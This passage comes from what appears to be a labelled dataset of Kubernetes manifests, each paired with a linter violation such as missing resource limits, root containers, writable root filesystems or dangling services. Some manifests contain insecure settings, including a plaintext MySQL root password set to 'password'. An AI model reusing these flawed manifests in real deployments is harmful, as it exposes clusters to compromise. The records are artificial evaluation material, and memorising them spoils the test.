    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-rbac-proxy-main\" has memory limit 0"
  },
  {
    "id": "3149",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-rbac-proxy-self\" has memory limit 0"
  },
  {
    "id": "3150",
    "manifest_path": "data/manifests/the_stack_sample/sample_0934.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: openshift-state-metrics\n  name: openshift-state-metrics\n  namespace: openshift-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: openshift-state-metrics\n  template:\n    metadata:\n      labels:\n        k8s-app: openshift-state-metrics\n    spec:\n      containers:\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8081/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-main\n        ports:\n        - containerPort: 8443\n          name: https-main\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:9443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8082/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/openshift/origin-kube-rbac-proxy:latest\n        name: kube-rbac-proxy-self\n        ports:\n        - containerPort: 9443\n          name: https-self\n        resources:\n          requests:\n            cpu: 1m\n            memory: 20Mi\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: openshift-state-metrics-tls\n          readOnly: false\n      - args:\n        - --host=127.0.0.1\n        - --port=8081\n        - --telemetry-host=127.0.0.1\n        - --telemetry-port=8082\n        image: quay.io/openshift/origin-openshift-state-metrics:latest\n        name: openshift-state-metrics\n        resources:\n          requests:\n            cpu: 1m\n            memory: 150Mi\n      serviceAccountName: openshift-state-metrics\n      volumes:\n      - name: openshift-state-metrics-tls\n        secret:\n          secretName: openshift-state-metrics-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"openshift-state-metrics\" has memory limit 0"
  },
  {
    "id": "3151",
    "manifest_path": "data/manifests/the_stack_sample/sample_0936.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: identity-api\n  labels:\n    app: eshop\n    service: identity\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n  selector:\n    service: identity\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:identity])"
  },
  {
    "id": "3152",
    "manifest_path": "data/manifests/the_stack_sample/sample_0938.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: pre1-escheduler-api\n    app: escheduler-api\n  name: pre1-escheduler-api\n  namespace: shentan-bigdata\nspec:\n  type: ClusterIP\n  ports:\n  - name: escheduler-api\n    port: 12345\n    targetPort: 12345\n    protocol: TCP\n  selector:\n    name: pod-escheduler-api\n    app: escheduler-api\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:escheduler-api name:pod-escheduler-api])"
  },
  {
    "id": "3153",
    "manifest_path": "data/manifests/the_stack_sample/sample_0939.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: vault-operator\n  labels:\n    helm.sh/chart: vault-operator-1.3.0\n    app.kubernetes.io/name: vault-operator\n    app.kubernetes.io/instance: vault-operator\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: environment\n  namespace: vault-infra\nspec:\n  type: ClusterIP\n  ports:\n  - port: 80\n    targetPort: 8080\n    protocol: TCP\n    name: http\n  - port: 8383\n    protocol: TCP\n    name: http-metrics\n  selector:\n    app.kubernetes.io/name: vault-operator\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:vault-operator])"
  },
  {
    "id": "3154",
    "manifest_path": "data/manifests/the_stack_sample/sample_0942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    description: Simple-Vault\n  labels:\n    app: simple-vault\n    environment: Development\n    tier: Service\n  name: simple-vault\n  namespace: sirius\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: simple-vault\n  template:\n    metadata:\n      labels:\n        app: simple-vault\n      name: simple-vault\n    spec:\n      containers:\n      - name: simple-vault\n        image: docker.io/swisschains/sirius-simple-vault:dev\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        - containerPort: 5001\n        readinessProbe:\n          httpGet:\n            path: /api/isalive\n            port: 5000\n          initialDelaySeconds: 40\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /api/isalive\n            port: 5000\n          initialDelaySeconds: 40\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 40m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: RemoteSettingsUrls__0\n          value: http://settings.common.svc.cluster.local/common\n        - name: RemoteSettingsUrls__1\n          value: http://settings.common.svc.cluster.local/sirius/common\n        - name: RemoteSettingsUrls__2\n          value: http://settings.common.svc.cluster.local/sirius/simple-vault\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"simple-vault\" does not have a read-only root file system"
  },
  {
    "id": "3155",
    "manifest_path": "data/manifests/the_stack_sample/sample_0942.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    description: Simple-Vault\n  labels:\n    app: simple-vault\n    environment: Development\n    tier: Service\n  name: simple-vault\n  namespace: sirius\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: simple-vault\n  template:\n    metadata:\n      labels:\n        app: simple-vault\n      name: simple-vault\n    spec:\n      containers:\n      - name: simple-vault\n        image: docker.io/swisschains/sirius-simple-vault:dev\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        - containerPort: 5001\n        readinessProbe:\n          httpGet:\n            path: /api/isalive\n            port: 5000\n          initialDelaySeconds: 40\n          periodSeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /api/isalive\n            port: 5000\n          initialDelaySeconds: 40\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 40m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: RemoteSettingsUrls__0\n          value: http://settings.common.svc.cluster.local/common\n        - name: RemoteSettingsUrls__1\n          value: http://settings.common.svc.cluster.local/sirius/common\n        - name: RemoteSettingsUrls__2\n          value: http://settings.common.svc.cluster.local/sirius/simple-vault\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"simple-vault\" is not set to runAsNonRoot"
  },
  {
    "id": "3156",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"frontendservice\" is using an invalid container image, \"karthequian/helloworld\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3157",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"frontendservice\" does not have a read-only root file system"
  },
  {
    "id": "3158",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql\" does not have a read-only root file system"
  },
  {
    "id": "3159",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"frontendservice\" is not set to runAsNonRoot"
  },
  {
    "id": "3160",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "3161",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"frontendservice\" has cpu request 0"
  },
  {
    "id": "3162",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql\" has cpu request 0"
  },
  {
    "id": "3163",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"frontendservice\" has memory limit 0"
  },
  {
    "id": "3164",
    "manifest_path": "data/manifests/the_stack_sample/sample_0952.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp-deployment\n  labels:\n    app: deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: deployment\n  template:\n    metadata:\n      labels:\n        app: deployment\n    spec:\n      containers:\n      - image: mysql:5.6\n        name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: password\n        ports:\n        - containerPort: 3306\n          name: mysql\n      - name: frontendservice\n        image: karthequian/helloworld\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        - -c\n        - echo 'start await' && cp /opt/scripts/*.sh /tmp && sh /tmp/await-tcp.sh\n          30 localhost:3306 -- nginx\n        ports:\n        - containerPort: 80\n        volumeMounts:\n        - name: await-volume\n          mountPath: /opt/scripts\n      volumes:\n      - name: await-volume\n        configMap:\n          name: await-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql\" has memory limit 0"
  },
  {
    "id": "3165",
    "manifest_path": "data/manifests/the_stack_sample/sample_0957.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-metrics-svc\n  namespace: ingress-nginx\n  labels:\n    app: nginx-metrics-svc\nspec:\n  selector:\n    app.kubernetes.io/name: ingress-nginx\n    app.kubernetes.io/part-of: ingress-nginx\n  ports:\n  - protocol: TCP\n    name: prometheus\n    port: 10254\n    targetPort: 10254\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:ingress-nginx app.kubernetes.io/part-of:ingress-nginx])"
  },
  {
    "id": "3166",
    "manifest_path": "data/manifests/the_stack_sample/sample_0961.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    command:\n    - kube-apiserver\n    args:\n    - --kubelet-https=true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"command-demo-container\" does not have a read-only root file system"
  },
  {
    "id": "3167",
    "manifest_path": "data/manifests/the_stack_sample/sample_0961.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    command:\n    - kube-apiserver\n    args:\n    - --kubelet-https=true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"command-demo-container\" is not set to runAsNonRoot"
  },
  {
    "id": "3168",
    "manifest_path": "data/manifests/the_stack_sample/sample_0961.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    command:\n    - kube-apiserver\n    args:\n    - --kubelet-https=true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"command-demo-container\" has cpu request 0"
  },
  {
    "id": "3169",
    "manifest_path": "data/manifests/the_stack_sample/sample_0961.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: command-demo\n  labels:\n    purpose: demonstrate-command\nspec:\n  containers:\n  - name: command-demo-container\n    image: gcr.io/google_containers/kube-apiserver-amd64:v1.6.0\n    command:\n    - kube-apiserver\n    args:\n    - --kubelet-https=true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"command-demo-container\" has memory limit 0"
  },
  {
    "id": "3170",
    "manifest_path": "data/manifests/the_stack_sample/sample_0962.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql-secret\nspec:\n  containers:\n  - image: mysql:5.5\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: mysql\n          key: password\n    imagePullPolicy: IfNotPresent\n    name: mysql\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql\" does not have a read-only root file system"
  },
  {
    "id": "3171",
    "manifest_path": "data/manifests/the_stack_sample/sample_0962.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql-secret\nspec:\n  containers:\n  - image: mysql:5.5\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: mysql\n          key: password\n    imagePullPolicy: IfNotPresent\n    name: mysql\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "3172",
    "manifest_path": "data/manifests/the_stack_sample/sample_0962.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql-secret\nspec:\n  containers:\n  - image: mysql:5.5\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: mysql\n          key: password\n    imagePullPolicy: IfNotPresent\n    name: mysql\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql\" has cpu request 0"
  },
  {
    "id": "3173",
    "manifest_path": "data/manifests/the_stack_sample/sample_0962.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mysql-secret\nspec:\n  containers:\n  - image: mysql:5.5\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      valueFrom:\n        secretKeyRef:\n          name: mysql\n          key: password\n    imagePullPolicy: IfNotPresent\n    name: mysql\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql\" has memory limit 0"
  },
  {
    "id": "3174",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ksql\" does not have a read-only root file system"
  },
  {
    "id": "3175",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ksql-demo\n  namespace: default\nspec:\n  containers:\n  - name: ksql-datagen-pageviews\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - exec ksql-datagen quickstart=pageviews format=delimited topic=pageviews bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql-datagen-users\n    image: confluentinc/ksql-examples:5.0.1\n    command:\n    - sh\n    - -c\n    - ksql-datagen quickstart=users format=json topic=users iterations=1000 bootstrap-server=my-confluent-oss-cp-kafka:9092\n  - name: ksql\n    image: confluentinc/ksql-cli:5.0.1\n    command:\n    - sh\n    - -c\n    - exec tail -f /dev/null\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ksql-datagen-pageviews\" does not have a read-only root file system"
  },
  {
    "id": "3176",
    "manifest_path": "data/manifests/the_stack_sample/sample_0963.yaml",
